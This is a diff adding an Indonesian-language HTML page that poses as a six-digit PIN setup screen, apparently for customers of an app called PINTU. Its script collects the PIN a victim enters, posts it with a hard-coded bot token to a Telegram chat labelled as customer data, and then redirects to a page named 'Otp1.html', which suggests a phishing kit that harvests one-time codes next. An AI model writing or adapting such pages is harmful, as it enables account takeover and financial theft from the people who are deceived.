@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Masukan PIN</title>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      height: 100vh;
+    }
+
+    h1 {
+      margin-top: 40px;
+      font-size: 26px;
+      font-weight: 700;
+    }
+
+    p {
+      margin: 8px 20px 40px;
+      color: #333;
+      font-size: 14px;
+    }
+
+    .pin-dots {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-bottom: 40px;
+    }
+
+    .dot {
+      width: 18px;
+      height: 18px;
+      background-color: #bbb;
+      border-radius: 50%;
+      transition: background-color 0.3s, transform 0.2s;
+    }
+
+    .dot.filled {
+      background-color: #000;
+    }
+
+    .dot.success {
+      background-color: #4CAF50; /* hijau */
+      transform: scale(1.2);
+    }
+
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      padding: 0 30px 70px;
+    }
+
+    .key {
+      font-size: 24px;
+      font-weight: 800;
+      color: #000;
+      padding: 15px 0;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .key:active {
+      opacity: 0.6;
+    }
+
+    .key.empty {
+      visibility: hidden;
+    }
+
+    .key.delete {
+      font-size: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div>
+    <h1>Buat PIN</h1>
+    <p>Masukkan PIN 6 digit untuk keamanan akun kamu</p>
+
+    <div class="pin-dots" id="pinDots">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="keypad">
+    <div class="key" data-key="1">1</div>
+    <div class="key" data-key="2">2</div>
+    <div class="key" data-key="3">3</div>
+    <div class="key" data-key="4">4</div>
+    <div class="key" data-key="5">5</div>
+    <div class="key" data-key="6">6</div>
+    <div class="key" data-key="7">7</div>
+    <div class="key" data-key="8">8</div>
+    <div class="key" data-key="9">9</div>
+    <div class="key empty"></div>
+    <div class="key" data-key="0">0</div>
+    <div class="key" data-key="delete">
+  <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
+    <path d="M20 12H7" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" />
+    <path d="M10 15L7 12L10 9" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" />
+  </svg>
+  </div>
+
+  <script>
+    // === Ganti dengan token & chat ID kamu ===
+    const BOT_TOKEN = "8544733481:AAH88M3g5IfA7mjltw8OxPVHWfs9cR8f5Ro";
+    const CHAT_ID = "5983910858";
+
+    const keys = document.querySelectorAll(".key");
+    const dots = document.querySelectorAll(".dot");
+    let pin = "";
+
+    keys.forEach(key => {
+      key.addEventListener("click", () => {
+        const value = key.dataset.key;
+
+        if (value === "delete") {
+          pin = pin.slice(0, -1);
+        } else if (!isNaN(value) && pin.length < 6) {
+          pin += value;
+        }
+
+        updateDots();
+
+        if (pin.length === 6) {
+          showSuccessDots();
+          setTimeout(() => {
+            sendToTelegram(pin);
+          }, 600);
+        }
+      });
+    });
+
+    function updateDots() {
+      dots.forEach((dot, i) => {
+        dot.classList.remove("success");
+        dot.classList.toggle("filled", i < pin.length);
+      });
+    }
+
+    function showSuccessDots() {
+      dots.forEach(dot => {
+        dot.classList.remove("filled");
+        dot.classList.add("success");
+      });
+    }
+
+    function sendToTelegram(pinValue) {
+      const message = `
+🔐 *DATA NASABAH PINTU*
+--------------------------
+
+🔢 PIN: ${pinValue}
+--------------------------
+      `;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "Otp1.html";
+        } else {
+          alert("Gagal mengirim ke Telegram!");
+        }
+      })
+      .catch(() => alert("Terjadi kesalahan koneksi."));
+    }
+  </script>
+
+</body>
+</html>
